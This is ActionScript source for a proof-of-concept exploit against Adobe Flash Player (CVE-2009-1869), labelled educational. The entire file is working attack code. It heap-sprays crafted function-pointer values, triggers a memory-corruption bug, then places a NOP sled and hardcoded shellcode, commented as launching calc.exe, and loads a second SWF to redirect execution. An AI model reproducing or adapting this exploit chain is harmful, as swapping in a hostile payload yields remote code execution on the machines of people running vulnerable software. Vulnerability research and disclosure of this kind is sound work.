// PoC for CVE-2009-1869, for educational purposes only
// Created by Roee Hay - roeehay@gmail.com

package  {
	import flash.display.*;
	import flash.text.TextField;
	import flash.utils.ByteArray;
	import flash.events.*;
	import flash.utils.Timer;
	import flash.net.*;
	import flash.external.ExternalInterface;
	import flash.utils.Endian;
	import flash.ui.ContextMenu;
	
	public class Exploit extends MovieClip {
		
				
		private function log(txt)
		{
			text1.appendText(txt + "\n");
		}

		public function exploit(evt:Event):void {
			state1_alloc_memory_overwrite();
		}
		
		public function state1_alloc_memory_overwrite():void {
			var val:ByteArray = new ByteArray();
			val.endian = Endian.LITTLE_ENDIAN;
			
			val.writeMultiByte("aaaaaaaaaaaaaaaaa", "us-ascii");

//			val.writeInt(0x103874ec); // mouse context menu callback fptr
			val.writeInt(0x10381160); // LoadVars.sendAndLoad callback fptr 
			val.writeInt(0x20450157); // shellcode placeholder address
			val.writeMultiByte("aaaaaa\x01aaaaaaaaaaaaaaaa", "us-ascii");
			for (var i=0; i<4; i++)
				val.writeInt(0);			
		
			log("1) allocating memory overwrite values..");
			HeapLib.alloc(val, HeapLib.POOL_SIZE * 160, state2_load_movie);
		}	

		public function state2_load_movie(evt:Event):void {			
			ExternalInterface.call("crash");
			log("2) triggering vulnerability..");
			var timer:Timer = new Timer(8000, 1);
			timer.addEventListener(TimerEvent.TIMER_COMPLETE, state3_free);
			timer.start();
			
		}
		public function state3_free(evt:Event):void {
			log("3) freeing memory..");
			HeapLib.free();
			var timer:Timer = new Timer(3000, 1);
			timer.addEventListener(TimerEvent.TIMER_COMPLETE, state4_alloc_shellcode);
			timer.start();

		}
		
		public function state4_alloc_shellcode(evt:Event):void {
			var val:ByteArray = new ByteArray();
			val.endian = Endian.LITTLE_ENDIAN;
			
			log("4) allocating shellcode..");

			for (var i = 0; i< 890; i++)
			{
				val.writeByte(0x90);
			}
			
			// executes calc.exe
			
			val.writeInt(0x335d6eeb);
			val.writeInt(0xb15151c9);
			val.writeInt(0x2904fe10);
			val.writeInt(0x5008458d);
			val.writeInt(0x3356f58b);
			val.writeInt(0x6430b1c9);
			val.writeInt(0x408b018b);
			val.writeInt(0x1c708b0c);
			val.writeInt(0x8588bad);
			val.writeInt(0x8b3c438b);
			val.writeInt(0x8d781844);
			val.writeInt(0xb11c1874);
			val.writeInt(0xc303ad03);
			val.writeInt(0x5dfae250);
			val.writeInt(0x8f348b5f);
			val.writeInt(0x448bf303);
			val.writeInt(0x66500424);
			val.writeInt(0x6641008b);
			val.writeInt(0x75580639);
			val.writeInt(0xc03350ec);
			val.writeInt(0xd003ac99);
			val.writeInt(0x4806c2c1);
			val.writeInt(0x6658f779);
			val.writeInt(0x7502503b);
			val.writeInt(0xb70f58d8);
			val.writeInt(0x3fe4d54);
			val.writeInt(0xff5e901c);
			val.writeInt(0xa2ebadd3);
			val.writeInt(0xffff8de8);
			val.writeInt(0xf16957ff);
			val.writeInt(0xb87845da);
			val.writeInt(0x6c616397);
			val.writeInt(0x78652e63);
			val.writeShort(0xff65);

			HeapLib.alloc(val, HeapLib.POOL_SIZE * 120, state5_trig_func);
				
			
		}
		
		public function state5_trig_func(evt:Event):void {
			log("5) triggering function");
			var ldr:Loader = new Loader();
			addChild(ldr);
			var url:URLRequest = new URLRequest("TriggerFunc.swf");
			ldr.load(url);
		}



		public function Exploit()  { 

			goButton.label = "Go!";
			goButton.addEventListener(MouseEvent.CLICK, exploit);
		}
	}
}